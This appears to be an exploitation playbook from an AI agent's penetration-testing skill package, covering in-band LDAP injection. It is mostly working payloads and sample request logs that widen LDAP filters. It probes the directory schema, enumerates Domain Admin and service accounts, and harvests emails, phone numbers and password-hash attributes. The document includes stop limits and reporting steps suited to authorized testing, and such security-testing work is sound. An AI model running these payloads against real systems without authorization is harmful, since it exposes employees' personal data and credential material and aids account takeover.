# LDAP In-Band Search Extraction

## Prerequisites

- Phase 2 Step 2.5 confirmed: visible output expands with wildcard or operator injection
- HIGH or MEDIUM confidence that input reaches LDAP filter
- Results (names, emails, attributes) reflected directly in the response

**Phase context:** This is a sub-file of Phase 4 (Exploitation) in SKILL.md.

## Core Principle

When the application reflects LDAP search results in the response, injecting wildcards and operator chains lets you expand what the filter matches — turning a narrow lookup into a broad directory dump.

**Typical filter structure being targeted:**

```
(cn=INPUT)
(uid=INPUT)
(mail=INPUT)
(&(objectClass=user)(cn=INPUT))
```

---

## Step 1: Wildcard Baseline

Confirm the wildcard expands scope:

```
Normal query:    param=alice    → 1 result
Wildcard query:  param=*        → X results (should be >> 1)
Prefix wildcard: param=a*       → Y results
```

**Resulting filter:** `(cn=*)` — matches all entries regardless of value.

Record:
- How many results return on `param=*`
- What attributes are visible in the response
- Whether pagination exists (may limit full extraction)

**Q:** What if `param=*` returns same 1 result as a normal query?
**A:** Wildcard is either being escaped or the app fixes query to exact match. Attempt operator injection in Step 2. If both fail, pivot to `ldap_blind_extraction.md`.

---

## Step 2: Operator Injection for Scope Expansion

Inject additional filter conditions to broaden matches or leak additional objectClasses:

```
param=*)(|(objectClass=*        → match ANY objectClass
param=*)(|(objectClass=user     → match user objects
param=*)(|(objectClass=person   → match person objects
param=*)(|(uid=*                → pull all uid attributes
param=*)(|(mail=*@*             → pull all mail entries
```

**Compare each result set against baseline wildcard.** More results or different attributes = operator injection working.

**Why this matters:** The original filter may only expose `person` objectClass, but injection can expose `computer`, `group`, or `serviceAccount` objects that wouldn't normally appear.

---

## Step 3: Schema Enumeration via objectClass Probing

Test which objectClass types exist in the directory:

```
param=*)(|(objectClass=person         → person entries?
param=*)(|(objectClass=user           → user entries? (AD)
param=*)(|(objectClass=inetOrgPerson  → inetOrgPerson? (OpenLDAP)
param=*)(|(objectClass=posixAccount   → POSIX accounts? (Linux/Unix LDAP)
param=*)(|(objectClass=group          → group objects?
param=*)(|(objectClass=computer       → machine accounts? (AD)
param=*)(|(objectClass=organizationalUnit → OU structure?
param=*)(|(objectClass=contact        → contact entries?
```

| Result | Interpretation |
|--------|---------------|
| Results returned | That objectClass exists in directory |
| No results | objectClass absent or filter not injected |
| Fewer results than full wildcard | Subset of directory uses that class |

---

## Step 4: Targeted Attribute Extraction

Once you know what's in the directory, extract by attribute value patterns:

### Extract All Entries (Bulk)

```
param=*           → all cn/uid entries (basic dump)
param=a*          → entries starting with 'a'
param=b*          → entries starting with 'b'
... (iterate a–z for full enumeration)
```

**Use prefix iteration if the result set is paginated** — break extraction into 26 prefix queries instead of a single dump.

### Extract by Attribute Pattern

```
param=*)(mail=*@corp.com          → all internal email users
param=*)(mail=*@external.com      → external contacts
param=*)(telephoneNumber=*        → entries with phone numbers
param=*)(description=*            → entries with descriptions (may contain notes/passwords)
param=*)(memberOf=*Admins*        → users in admin groups
```

### Extract Privileged Accounts

```
param=*)(|(uid=admin)(uid=root)(uid=svc)(uid=service)
param=*)(cn=Admin*
param=*)(memberOf=CN=Administrators*
param=*)(memberOf=CN=Domain Admins*
```

---

## Step 5: Harvest Sensitive Attributes

If the response reflects multiple attributes per result, look for:

| Attribute | Sensitivity | Typical Contains |
|-----------|------------|-----------------|
| `userPassword` | CRITICAL | Password hash or cleartext |
| `unicodePwd` | CRITICAL | AD NT hash |
| `shadowPassword` | CRITICAL | Unix shadow hash |
| `mail` | HIGH | Email addresses |
| `memberOf` | HIGH | Group memberships |
| `description` | MEDIUM-HIGH | Often contains notes, sometimes passwords |
| `telephoneNumber` | MEDIUM | PII |
| `homeDirectory` | MEDIUM | File paths |
| `loginShell` | LOW | Shell info |
| `uidNumber` | LOW | POSIX UID |

**Q:** What if attributes aren't showing in the response?
**A:** The application may be filtering which attributes it displays. Pivot to `ldap_blind_extraction.md` to extract them character-by-character even without direct reflection.

---

## Attempt Limits

| Stage | Max Requests |
|-------|-------------|
| objectClass enumeration | 10 probes |
| Full wildcard dump | 1 request (then stop if >50 results) |
| Prefix iteration (a–z) | 26 requests |
| Targeted attribute patterns | 10 probes |
| Privileged account targeting | 5 probes |

**After confirming bulk extraction is possible and sampling a few records → Stop. Report HIGH.**

Do not attempt to extract all records. A sample of 5–10 records is sufficient evidence.

---

## Reasoning Format

```
[LDAP-INBAND]
[WILDCARD-TEST]  param=* → {X results vs baseline 1 result}
[OPERATOR-INJ]   {payload} → {result count / new attributes observed}
[SCHEMA-FOUND]   objectClass: {list confirmed}
[ATTRS-VISIBLE]  {attributes reflected in response}
[SENSITIVE-ATTRS] {e.g., mail confirmed, memberOf confirmed, userPassword absent}
[SAMPLE-EXTRACTED] {e.g., 3 user records including admin@corp.com}
[ACTION]         {STOP — Report HIGH/CRITICAL}
```

---

## Stop Conditions

| Condition | Action |
|-----------|--------|
| `userPassword` or hash visible in results | **STOP.** Report CRITICAL. |
| Admin group membership visible | **STOP.** Report CRITICAL. |
| >10 PII records (email, phone) confirmed dumpable | Report HIGH. Stop bulk extraction. |
| Schema enumerated + sample records extracted | Sufficient — Report HIGH. Stop. |
| Rate limiting triggered | Back off, document count extracted so far. |

---

## Few-Shot Examples

### Example 1: Wildcard Dump — Employee Directory

```
[LDAP-INBAND]
[WILDCARD-TEST]  param=* → 183 results vs baseline 1 result (Length: 48,200 vs 312)
[ATTRS-VISIBLE]  cn, mail, telephoneNumber, department, title
[SENSITIVE-ATTRS] mail confirmed (183 addresses), telephoneNumber (PII)
[SAMPLE]         alice@corp.com, bob@corp.com, charlie@corp.com (3 of 183)
[ACTION]         STOP — Report HIGH. Full employee PII directory dumpable.
```

### Example 2: Admin Account Extraction via memberOf

```
[LDAP-INBAND]
[WILDCARD-TEST]    param=* → 47 results
[OPERATOR-INJ]     param=*)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=com
                   → 3 results: jsmith, svc_backup, administrator
[SENSITIVE-ATTRS]  memberOf = Domain Admins confirmed for 3 accounts
[ACTION]           STOP — Report CRITICAL. Admin account enumeration via LDAP injection.
```

### Example 3: objectClass Expansion — Machine Accounts

```
[LDAP-INBAND]
[WILDCARD-TEST]   param=* → 22 results (person objects only initially)
[SCHEMA-PROBE]    objectClass=computer → 14 additional results (machine accounts)
[ATTRS-VISIBLE]   cn (hostname), operatingSystem, operatingSystemVersion
[SAMPLE]          WIN-DC01, WIN-APP02, WIN-SQL01 with OS versions
[ACTION]          Report MEDIUM. Internal network topology disclosed via LDAP injection.
```
